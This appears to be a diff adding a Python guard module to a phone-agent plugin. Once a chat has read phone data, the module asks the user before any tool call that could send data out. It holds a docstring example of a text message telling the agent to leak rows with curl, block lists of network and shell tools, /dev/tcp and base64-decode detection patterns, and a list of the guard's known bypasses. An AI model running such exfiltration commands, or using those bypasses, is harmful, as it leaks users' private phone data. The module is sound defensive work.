@@ -1,0 +1,660 @@
+"""After a chat has read phone data, ask before anything that can send data out.
+
+A text message the agent read can tell it to leak the rows ("run curl https://x/?d=..."). Once a chat has called
+`phone_data` (whatever the outcome), this module makes `pre_tool_call` return Hermes's
+`{"action": "approve", ...}`, which asks the user through the normal approval gate before: terminal commands that run
+network tools or decoded text, code that talks to the network, web and browser tools, tools that write to a running
+process, and tools that save text other chats can read (`memory`, `skill_manage`). Reading files and ordinary commands
+run as usual. Each ask uses a fresh `rule_key`, so no "always" or "this session" answer ever carries over to the next one.
+
+Which chat: a chat is known by two ids, the gateway's runtime id (HERMES_UI_SESSION_ID, new after a gateway restart and
+`session.resume`) and the agent's stored id (`session_id`, the same after a resume, new after a context compression).
+Both are remembered, and when a call matches one of them the other is added, so a resume or a compression keeps the chat
+marked. A subagent is linked to its parent through Hermes's `subagent_start` hook (`link_subagent`), and it also
+inherits the runtime id.
+
+Honest limits: it is a speed bump. The command list is patterns on command words, so a script file that makes the call
+or an unusual construction can slip through; the agent runs in Termux and could edit the state file; in Full access and
+Auto access Hermes's gate approves without asking; and a chat whose runtime id and stored id both change before any tool
+call is no longer recognised.
+
+The chats that have read are remembered in memory and in ~/.hermes/mobile/phone-read.json (chat ids and times only,
+never data, at most MAX_CHATS, written atomically under a file lock). A broken file means no entries.
+Nothing here logs a command, a result or a message.
+"""
+
+from __future__ import annotations
+
+import contextlib
+import json
+import os
+import re
+import secrets
+import threading
+import time
+from pathlib import Path
+from typing import Any, Dict, Iterable, Iterator, List, Optional, Tuple
+
+PATH = Path.home() / ".hermes" / "mobile" / "phone-read.json"
+MAX_CHATS = 2000
+MAX_SHOWN = 300   # characters of a command shown in the ask (the start and the end when it is longer)
+MAX_SCAN = 20000  # characters of a command or script looked at
+MAX_DEPTH = 4     # nested `bash -c '...'` levels looked into
+
+_lock = threading.Lock()
+_mem: Dict[str, float] = {}
+_parents: Dict[str, str] = {}   # subagent stored id -> parent stored id (this process only)
+_cache: tuple = (None, {})   # ((mtime_ns, inode, size), {chat: time})
+
+
+def chat_ids(session_id: Any = "", task_id: Any = "") -> Tuple[str, ...]:
+    """Every id this chat is known by: the gateway's runtime id (HERMES_UI_SESSION_ID, a ContextVar a subagent inherits)
+    and the agent's stored id (`session_id`). Either one matching marks the chat."""
+    out: List[str] = []
+    try:
+        from gateway.session_context import _SESSION_UI_SESSION_ID
+        v = _SESSION_UI_SESSION_ID.get()
+        if isinstance(v, str) and v:
+            out.append(v)
+    except Exception:
+        pass
+    for v in (session_id, task_id if not session_id else ""):
+        v = str(v or "").strip()
+        if v and v not in out:
+            out.append(v)
+    return tuple(out)
+
+
+def _norm(ids: Any) -> List[str]:
+    if isinstance(ids, str):
+        ids = [ids]
+    out: List[str] = []
+    for i in ids or ():
+        i = str(i or "").strip()[:200]
+        if i and i not in out:
+            out.append(i)
+    return out
+
+
+def _with_parents(ids: List[str]) -> List[str]:
+    out = list(ids)
+    for i in list(out):
+        for _ in range(8):   # a chain of subagents
+            i = _parents.get(i, "")
+            if not i or i in out:
+                break
+            out.append(i)
+    return out
+
+
+def _read_file() -> Dict[str, float]:
+    try:
+        d = json.loads(PATH.read_text())
+        raw = d.get("chats") if isinstance(d, dict) else None
+        return {str(k)[:200]: float(v) for k, v in raw.items()} if isinstance(raw, dict) else {}
+    except Exception:
+        return {}   # a broken file means no entries
+
+
+def _file_chats() -> Dict[str, float]:
+    global _cache
+    try:
+        s = PATH.stat()
+        st = (s.st_mtime_ns, s.st_ino, s.st_size)
+    except OSError:
+        return {}
+    if _cache[0] == st:
+        return _cache[1]
+    chats = _read_file()
+    _cache = (st, chats)
+    return chats
+
+
+def has_read(ids: Any) -> bool:
+    ids = _with_parents(_norm(ids))
+    if not ids:
+        return False
+    with _lock:
+        known = _file_chats()
+        return any(i in _mem or i in known for i in ids)
+
+
+@contextlib.contextmanager
+def _file_lock() -> Iterator[None]:
+    """An exclusive lock on a file next to the state file, so two processes can't each write over the other's entry."""
+    fd = None
+    try:
+        import fcntl
+        PATH.parent.mkdir(parents=True, exist_ok=True)
+        fd = os.open(str(PATH) + ".lock", os.O_CREAT | os.O_RDWR, 0o600)
+        fcntl.flock(fd, fcntl.LOCK_EX)
+    except Exception:
+        pass   # no locking here (no fcntl): still write, as before
+    try:
+        yield
+    finally:
+        if fd is not None:
+            try:
+                os.close(fd)   # closing releases the lock
+            except OSError:
+                pass
+
+
+def mark(ids: Any) -> None:
+    """This chat (every id given, and its parents) has called phone_data. Never raises."""
+    ids = _with_parents(_norm(ids))
+    if not ids:
+        return
+    try:
+        with _lock:
+            now = time.time()
+            for i in ids:
+                _mem.pop(i, None)
+                _mem[i] = now
+            while len(_mem) > MAX_CHATS:
+                _mem.pop(next(iter(_mem)))
+            try:
+                with _file_lock():
+                    chats = _read_file()   # read again inside the lock: another process may have added entries
+                    for i in ids:
+                        chats.pop(i, None)
+                        chats[i] = now
+                    while len(chats) > MAX_CHATS:
+                        chats.pop(next(iter(chats)))
+                    PATH.parent.mkdir(parents=True, exist_ok=True)
+                    tmp = PATH.with_name(PATH.name + f".{os.getpid()}.tmp")
+                    tmp.write_text(json.dumps({"chats": chats}))
+                    tmp.replace(PATH)
+            except Exception:
+                pass   # the in-memory entry still holds for this process
+    except Exception:
+        pass
+
+
+def link_subagent(parent_id: Any, child_id: Any) -> None:
+    """Hermes's `subagent_start` hook: remember who spawned whom. A child of a chat that has read is marked at once; a
+    child that reads later marks its parent (`mark` follows the links). Never raises."""
+    try:
+        parent, child = str(parent_id or "").strip()[:200], str(child_id or "").strip()[:200]
+        if not parent or not child or parent == child:
+            return
+        with _lock:
+            if len(_parents) > MAX_CHATS:
+                _parents.clear()
+            _parents[child] = parent
+        if has_read(parent):
+            mark(child)
+    except Exception:
+        pass
+
+
+# ── what can send data out ──────────────────────────────────────────────────
+
+_NET_WORDS = frozenset((
+    "curl wget nc ncat netcat socat ssh scp sftp rsync ftp lftp tftp telnet nmap nslookup dig host ping traceroute "
+    "sendmail mail mutt msmtp ssmtp swaks mosquitto_pub aria2c lynx w3m links httpie http https xh rclone "
+    "termux-sms-send termux-share termux-open termux-open-url termux-telephony-call xdg-open").split())
+_SHELLS = frozenset("sh bash zsh dash ash ksh csh tcsh fish".split())
+_INTERP = re.compile(r"^(?:python[0-9.]*|pypy3?|node(?:js)?|deno|bun|perl|ruby|php|lua|luajit|tclsh|osascript|Rscript)$")
+_ONELINER = re.compile(r"^(?:-[a-zA-Z]*[ceEr]|-p[ne]?|--eval|--exec|--print)$")   # -c -e -E -r -pe -ne --eval ...
+_NET_MODULES = ("http.server", "SimpleHTTPServer", "smtpd", "smtplib", "ftplib", "telnetlib", "socket", "urllib",
+                "http.client", "xmlrpc", "pyftpdlib", "aiohttp", "requests", "httpx", "uvicorn", "websockets")
+_GIT_SENDS = frozenset(("push", "clone", "fetch", "pull", "ls-remote", "send-email", "request-pull"))
+_GIT_OPT_ARG = frozenset(("-C", "-c", "--git-dir", "--work-tree", "--namespace", "--super-prefix", "--config-env"))
+_ASSIGN = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
+_PLACEHOLDER = "\x00"   # stands in for a $(...) or backtick substitution inside a word
+_VAR_WORD = re.compile(r"^(?:\x00+|\$[A-Za-z_]\w*|\$\{[^}]*\})$")
+_DECODE = re.compile(
+    r"\bbase64\b[^|;&\n]*\s-(?:d|D|-decode)\b|\bbase32\b[^|;&\n]*\s-d\b|\bxxd\b[^|;&\n]*\s-r\b|\buudecode\b"
+    r"|\bopenssl\b[^|;&\n]*\benc\b[^|;&\n]*\s-d\b|\bprintf\b[^|;&\n]*\\x[0-9a-fA-F]|\bprintf\b[^|;&\n]*\\[0-7]{3}")
+# wrapper command -> its options that take a value (the wrapped command comes after the options)
+_WRAP: Dict[str, frozenset] = {
+    "sudo": frozenset(("-u", "-g", "-h", "-p", "-C", "-D", "-R", "-T", "-U", "--user", "--group")),
+    "doas": frozenset(("-u", "-C")), "env": frozenset(("-u", "-C", "--unset", "--chdir")),
+    "xargs": frozenset(("-I", "-n", "-P", "-d", "-E", "-L", "-s", "-a", "-l")), "nohup": frozenset(),
+    "time": frozenset(("-f", "-o")), "command": frozenset(), "exec": frozenset(("-a",)), "builtin": frozenset(),
+    "nice": frozenset(("-n",)), "ionice": frozenset(("-c", "-n", "-p")), "timeout": frozenset(("-s", "-k")),
+    "stdbuf": frozenset(("-i", "-o", "-e")), "setsid": frozenset(), "busybox": frozenset(), "toybox": frozenset(),
+    "watch": frozenset(("-n", "-d")), "then": frozenset(), "do": frozenset(), "else": frozenset(), "elif": frozenset(),
+    "if": frozenset(), "while": frozenset(), "until": frozenset(), "!": frozenset(), "{": frozenset(),
+    "unbuffer": frozenset(), "chrt": frozenset(), "taskset": frozenset(("-c",)),
+}
+
+# One command of a parsed line: (words, dyn flags, got its input from a pipe)
+_Cmd = Tuple[List[str], List[bool], bool]
+
+
+def _parse(text: str) -> List[_Cmd]:
+    """Split shell text into simple commands, quote-aware: `;`, `&&`, `||`, `|`, newlines, `(`..`)`, `$(`..`)` and
+    backticks start a new command (even inside double quotes for `$(` and backticks), and a substitution leaves a
+    placeholder in the word it sits in. A rough reader, not a shell."""
+    t = text[:MAX_SCAN]
+    n = len(t)
+    cmds: List[_Cmd] = []
+    S: Dict[str, Any] = {"w": [], "d": [], "cur": [], "has": False, "dyn": False, "q": None, "piped": False, "depth": 0}
+    stack: List[Tuple[str, Dict[str, Any]]] = []
+
+    def endword() -> None:
+        if S["has"]:
+            S["w"].append("".join(S["cur"]))
+            S["d"].append(S["dyn"])
+        S["cur"], S["has"], S["dyn"] = [], False, False
+
+    def endcmd(piped: bool = False) -> None:
+        endword()
+        if S["w"]:
+            cmds.append((S["w"], S["d"], S["piped"]))
+        S["w"], S["d"], S["piped"] = [], [], piped
+
+    def push(kind: str) -> None:
+        saved = dict(S)
+        stack.append((kind, saved))
+        S.update({"w": [], "d": [], "cur": [], "has": False, "dyn": False, "q": None, "piped": False, "depth": 0})
+
+    def pop() -> None:
+        endcmd()
+        _kind, saved = stack.pop()
+        S.clear()
+        S.update(saved)
+        S["cur"] = list(S["cur"]) + [_PLACEHOLDER]
+        S["has"], S["dyn"] = True, True
+
+    i = 0
+    while i < n:
+        c = t[i]
+        q = S["q"]
+        if q == "'":
+            if c == "'":
+                S["q"] = None
+            else:
+                S["cur"].append(c)
+            i += 1
+            continue
+        if c == "\\":
+            if i + 1 < n:
+                if t[i + 1] != "\n":
+                    S["cur"].append(t[i + 1])
+                    S["has"] = True
+                i += 2
+            else:
+                i += 1
+            continue
+        if c == "$" and t.startswith("$(", i):
+            push("$(")
+            i += 2
+            continue
+        if c == "`":
+            if stack and stack[-1][0] == "`":
+                pop()
+            else:
+                push("`")
+            i += 1
+            continue
+        if c == "$" and i + 1 < n and (t[i + 1].isalnum() or t[i + 1] in "_{"):
+            S["dyn"] = True   # a variable: the word is not known
+        if q == '"':
+            if c == '"':
+                S["q"] = None
+                S["has"] = True
+            else:
+                S["cur"].append(c)
+                S["has"] = True
+            i += 1
+            continue
+        if c == "'":
+            S["q"], S["has"] = "'", True
+        elif c == '"':
+            S["q"], S["has"] = '"', True
+        elif c in " \t\r":
+            endword()
+        elif c in ";\n":
+            endcmd()
+        elif c == "&":
+            if t.startswith("&&", i):
+                i += 1
+                endcmd()
+            elif t.startswith("&>", i):
+                S["cur"].append(c)
+                S["has"] = True
+            else:
+                endcmd()
+        elif c == "|":
+            if t.startswith("||", i):
+                i += 1
+                endcmd()
+            elif t.startswith("|&", i):
+                i += 1
+                endcmd(True)
+            else:
+                endcmd(True)
+        elif c == "(":
+            S["depth"] += 1
+            endcmd()
+        elif c == ")":
+            if S["depth"] > 0:
+                S["depth"] -= 1
+                endcmd()
+            elif stack and stack[-1][0] == "$(":
+                pop()
+            else:
+                endcmd()
+        elif c == "#" and not S["has"]:
+            while i < n and t[i] != "\n":
+                i += 1
+            continue
+        else:
+            S["cur"].append(c)
+            S["has"] = True
+        i += 1
+    while stack:
+        pop()
+    endcmd()
+    return cmds
+
+
+def _base(word: str) -> str:
+    return word.rstrip("/").rsplit("/", 1)[-1]
+
+
+def _is_redirect(w: str) -> bool:
+    return bool(re.match(r"^(?:\d*|&)[<>]", w))
+
+
+def _split_args(args: List[str], dyn: List[bool]) -> Tuple[List[str], List[bool], bool]:
+    """The arguments (and their built-at-run-time flags) without redirections, and whether the command is fed inline
+    text (`<<EOF`, `<<<`)."""
+    out: List[str] = []
+    outd: List[bool] = []
+    inline = False
+    skip = False
+    for a, f in zip(args, dyn):
+        if skip:
+            skip = False
+            continue
+        if _is_redirect(a):
+            if a.startswith("<<"):
+                inline = True
+            if re.match(r"^(?:\d*|&)[<>]+$", a):
+                skip = True   # the target (a file, a here-string, the heredoc word) is the next word
+            continue
+        out.append(a)
+        outd.append(f)
+    return out, outd, inline
+
+
+def _strip_wrappers(w: List[str], d: List[bool]) -> int:
+    """Index of the command word after assignments (`X=1`) and wrappers (`sudo`, `env`, `xargs`, `busybox`...)."""
+    i = 0
+    while i < len(w):
+        x = w[i]
+        if _ASSIGN.match(x):
+            i += 1
+            continue
+        base = _base(x)
+        if base not in _WRAP:
+            break
+        opts = _WRAP[base]
+        i += 1
+        duration = base == "timeout"
+        while i < len(w):
+            y = w[i]
+            if y == "--":
+                i += 1
+                break
+            if base == "env" and _ASSIGN.match(y):
+                i += 1
+            elif y.startswith("-") and y != "-":
+                i += 2 if y in opts else 1
+            elif duration and re.match(r"^\d", y):
+                duration = False
+                i += 1
+            else:
+                break
+    return i
+
+
+def _match_cmd(cmd: _Cmd, whole: str, depth: int) -> Optional[str]:
+    w, d, piped = cmd
+    i = _strip_wrappers(w, d)
+    if i >= len(w):
+        return None
+    word = w[i]
+    base = _base(word)
+    args, argd, inline = _split_args(w[i + 1:], d[i + 1:])
+    fed = piped or inline   # the command reads text from a pipe or a heredoc
+    if base in _NET_WORDS:
+        return f"network command {base}"
+    if base == "gh":
+        return "gh (GitHub CLI)"
+    if base == "git":
+        j = 0
+        while j < len(args):
+            a = args[j]
+            if a in _GIT_OPT_ARG:
+                j += 2
+            elif a.startswith("-"):
+                j += 1
+            else:
+                return f"git {a}" if a in _GIT_SENDS else None
+        return None
+    if base == "eval":
+        return "eval (runs built text)"
+    if base in _SHELLS or base == "su":
+        # `bash -c '...'`: look inside the text it runs; a text built from a substitution that decodes something is asked
+        for j, a in enumerate(args):
+            if a == "--":
+                break
+            if re.match(r"^-[a-zA-Z]+$", a) and "c" in a[1:] and j + 1 < len(args):
+                r = _match_text(args[j + 1], depth + 1)
+                if r:
+                    return r
+                if argd[j + 1] and _DECODE.search(whole):
+                    return f"text decoded and run by {base} -c"
+                return None
+        if base == "su":
+            return None
+        scripts = [a for a in args if not a.startswith("-") and a != "-"]
+        if (piped or inline) and not scripts:
+            return f"text piped into {base}"
+        return None
+    if _INTERP.match(base):
+        j = 0
+        while j < len(args):
+            a = args[j]
+            if a == "-":
+                return f"{base} reading code from input"
+            if a == "-m" and j + 1 < len(args):
+                mod = args[j + 1]
+                return f"{base} -m {mod}" if mod.startswith(_NET_MODULES) else None
+            if a.startswith("-m") and len(a) > 2:
+                return f"{base} {a}" if a[2:].startswith(_NET_MODULES) else None
+            if a.startswith("-"):
+                if _ONELINER.match(a):
+                    return f"{base} one-liner ({a})"
+                j += 2 if a in ("-W", "-X", "--require") else 1
+                continue
+            return None   # a script file: its contents are not looked at
+        return f"{base} reading code from input" if fed else None
+    if base in ("find", "fd", "fdfind"):
+        for j, a in enumerate(args):
+            if a in ("-exec", "-execdir", "-ok", "-okdir", "-x", "-X", "--exec", "--exec-batch"):
+                inner: List[str] = []
+                for b in args[j + 1:]:
+                    if b in (";", "+"):
+                        break
+                    inner.append(b)
+                if inner:
+                    r = _match_cmd((inner, [False] * len(inner), False), whole, depth)
+                    if r:
+                        return f"{base} {a} {r}"
+        return None
+    if base in ("awk", "gawk", "mawk", "busybox-awk"):
+        if any(("system(" in a or "/inet/" in a or re.search(r'\|\s*"', a) or "|&" in a) for a in args):
+            return f"{base} program that runs commands"
+        return None
+    if base == "am" and args and args[0] in ("start", "broadcast", "startservice", "start-activity"):
+        return f"am {args[0]}"
+    if base == "cmd" and args and args[0] in ("activity", "package"):
+        return f"cmd {args[0]}"
+    if base == "service" and args and args[0] == "call":
+        return "service call"
+    if base == "monkey":
+        return "monkey"
+    if base == "openssl" and args and args[0] == "s_client":
+        return "openssl s_client"
+    if d[i] and _VAR_WORD.match(word):
+        # `$(echo ...|base64 -d) arg`, `$X arg`: the command itself is built at run time
+        if _DECODE.search(whole) or "://" in whole:
+            return "command built at run time"
+    return None
+
+
+def _match_text(text: str, depth: int = 0) -> Optional[str]:
+    if depth > MAX_DEPTH:
+        return None
+    t = text[:MAX_SCAN]
+    if re.search(r"/dev/(?:tcp|udp)/", t):
+        return "/dev/tcp or /dev/udp"
+    for cmd in _parse(t):
+        r = _match_cmd(cmd, t, depth)
+        if r:
+            return r
+    return None
+
+
+_RE_NETCODE = re.compile(
+    r"urllib|requests|http\.client|httplib|httpx|aiohttp|socket|urlopen|ftplib|smtplib|telnetlib|paramiko|asyncssh|websocket"
+    r"|xmlrpc|fetch\s*\(|XMLHttpRequest|net\.connect|require\(\s*['\"](?:https?|net|tls|dgram|child_process)"
+    r"|https?\.(?:get|request)|node:(?:https?|net)|IO::Socket|LWP|Net::|open-uri|file_get_contents|fsockopen|curl_init"
+    r"|\bsubprocess\b|os\.system|os\.popen|\bpopen\b|child_process|\bexec\s*\(|hermes_tools|web_search|web_extract|send_message",
+    re.I)
+_RE_URL = re.compile(r"https?://", re.I)
+
+_ALWAYS = frozenset({"web_search", "web_extract", "x_search", "send_message", "react_to_message", "computer_use",
+                     "delegate_task", "cronjob_manage", "image_generate", "video_generate", "text_to_speech"})
+_IF_URL = frozenset({"vision_analyze", "video_analyze", "browser_get_images"})
+_PERSIST = frozenset({"memory", "skill_manage"})   # text saved here is read by other chats
+# Never asked, whatever else matches: tools of this plugin and Hermes tools that send nothing out.
+_QUIET = frozenset({"phone_data", "phone_app", "canvas", "clarify", "todo", "todo_list", "read_file", "write_file",
+                    "patch", "search_files", "skill_view", "skills_list", "session_search", "tool_search", "tool_describe"})
+
+
+def _calls(tool_name: Any, args: Any) -> Iterator[Tuple[str, Dict[str, Any]]]:
+    """The tool calls inside one call: Hermes's Tool Search bridge (`tool_call`) can carry several."""
+    if tool_name == "tool_call" and isinstance(args, dict) and isinstance(args.get("calls"), list):
+        for c in args["calls"]:
+            if isinstance(c, dict) and c.get("name"):
+                inner = c.get("arguments")
+                yield str(c["name"]), inner if isinstance(inner, dict) else {}
+        return
+    yield str(tool_name or ""), args if isinstance(args, dict) else {}
+
+
+def command_match(text: str) -> Optional[str]:
+    """The name of the pattern when a shell command (a pipeline, `bash -c '...'`, `$(...)`...) can send data out."""
+    return _match_text(text)
+
+
+def command_sends_out(text: str) -> bool:
+    return command_match(text) is not None
+
+
+def code_match(text: str) -> Optional[str]:
+    """The pattern name when a script given to execute_code can reach the network or run a command."""
+    t = text[:MAX_SCAN]
+    if _RE_NETCODE.search(t):
+        return "code that uses the network or runs commands"
+    return _match_text(t)
+
+
+def code_sends_out(text: str) -> bool:
+    return code_match(text) is not None
+
+
+def _first_text(a: Dict[str, Any], *keys: str) -> str:
+    for k in keys:
+        v = a.get(k)
+        if isinstance(v, str) and v:
+            return v
+    return ""
+
+
+def _saved_text(a: Dict[str, Any]) -> str:
+    """The text a memory or skill call would save."""
+    ops = a.get("operations")
+    parts = [_first_text(o, "content", "new_text", "file_content") for o in ops if isinstance(o, dict)] \
+        if isinstance(ops, list) else []
+    parts.append(_first_text(a, "content", "new_text", "file_content", "new_string", "description"))
+    return " | ".join(p for p in parts if p)
+
+
+def classify(name: str, a: Dict[str, Any]) -> Optional[Tuple[str, str, str]]:
+    """None when the call sends nothing out, else (tool name, what to show the user, the pattern that matched)."""
+    if name in _QUIET:
+        return None
+    if name == "terminal":
+        cmd = _first_text(a, "command", "code")
+        why = command_match(cmd)
+        return (name, cmd, why) if why else None
+    if name == "execute_code":
+        code = _first_text(a, "code", "command")
+        why = code_match(code)
+        return (name, code, why) if why else None
+    if name == "process_manage":
+        act = str(a.get("action") or "")
+        if act in ("write", "submit"):   # sends text to a running background shell or program
+            return name, f"{act} {_first_text(a, 'data')}", f"process_manage {act} (text typed into a running process)"
+        return None
+    if name in _PERSIST:
+        act = str(a.get("action") or "")
+        if name == "memory" and act in ("remove", "delete", "list", "read", "get"):
+            return None
+        return name, f"{act} {_saved_text(a)}".strip(), f"{name} (saves text that other chats can read)"
+    if name in _IF_URL:
+        return (name, "", f"{name} with a web address") if any(
+            isinstance(v, str) and _RE_URL.search(v) for v in a.values()) else None
+    if name in _ALWAYS or name.startswith("browser_") or name.startswith("mcp_") or name.startswith("send_"):
+        return name, _first_text(a, "url", "query"), f"tool {name}"
+    return None
+
+
+def _flat(s: str) -> str:
+    return " ".join(s.split())
+
+
+def _clip(s: str) -> str:
+    """The start and the end of a long text, so padding in the middle can't hide what is at the end."""
+    if len(s) <= MAX_SHOWN:
+        return s
+    h = MAX_SHOWN // 2
+    return f"{s[:h]} … ({len(s)} characters, middle not shown) … {s[-h:]}"
+
+
+def ask_text(name: str, shown: str, why: str = "") -> str:
+    s = _clip(_flat(shown))
+    tag = f"Matched: {why}. " if why else ""
+    if name in _PERSIST:
+        return ("This chat has read data from your phone, and the agent wants to save text where other chats can read it, "
+                "which would carry phone data into them. Allow only if the text holds nothing from your phone. "
+                f"{tag}It would save: {s or name}")
+    what = f"the tool {name}" if not s else (f"the command: {s}" if name == "terminal" else f"{name}: {s}")
+    return ("This chat has read data from your phone, and the agent wants to run something that can send data out. "
+            f"Allow only if you asked for it. {tag}It would run {what}")
+
+
+def check(tool_name: Any, args: Any, ids: Any) -> Optional[dict]:
+    """A pre_tool_call directive asking the user, or None. The ask is a fresh one every time (new rule_key).
+    A chat known by one of its ids gets the others added, so a resume or a compression keeps it marked."""
+    ids = _norm(ids)
+    if not has_read(ids):
+        return None
+    with _lock:
+        known = _file_chats()
+        missing = [i for i in ids if i not in _mem and i not in known]
+    if missing:
+        mark(ids)
+    for name, a in _calls(tool_name, args):
+        hit = classify(name, a)
+        if hit is not None:
+            return {"action": "approve", "message": ask_text(*hit), "rule_key": "phone_read_out:" + secrets.token_hex(8)}
+    return None
